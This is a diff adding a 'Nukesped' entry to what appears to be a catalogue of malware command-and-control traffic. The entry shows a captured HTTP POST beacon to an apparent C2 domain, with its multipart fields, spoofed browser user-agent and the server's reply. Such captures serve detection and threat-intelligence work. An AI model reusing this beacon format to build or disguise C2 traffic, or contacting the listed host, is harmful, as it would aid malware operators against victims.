@@ -2101,6 +2101,45 @@ error was encountered while trying to use an ErrorDocument to handle the request
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/neutrino.png "Neutrino")
 
+#### Nukesped
+~~~
+POST /list.php?v=1530 HTTP/1.1
+Connection: Keep-Alive
+Content-Type: multipart/form-data; boundary=FE4149CA-3412-4743-9789-F6C0D0371C4F
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
+Content-Length: 385
+Host: lastedforcast.com
+
+
+
+--FE4149CA-3412-4743-9789-F6C0D0371C4F
+Content-Disposition: form-data; name="_media_1"
+
+15868
+--FE4149CA-3412-4743-9789-F6C0D0371C4F
+Content-Disposition: form-data; name="_media_2"
+
+16
+--FE4149CA-3412-4743-9789-F6C0D0371C4F
+Content-Disposition: form-data; name="file"; filename="Sy2LbbDxqF1W.img"
+Content-Type: octet-stream
+
+
+--FE4149CA-3412-4743-9789-F6C0D0371C4F--
+
+HTTP/1.1 200 OK
+Date: Fri, 12 Jun 2020 03:32:37 GMT
+Server: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.2.31
+X-Powered-By: PHP/7.2.31
+Content-Length: 1
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+0
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/nukesped.png "Nukesped")
+
 #### Orcus RAT
 Machine name is SNI
 ~~~
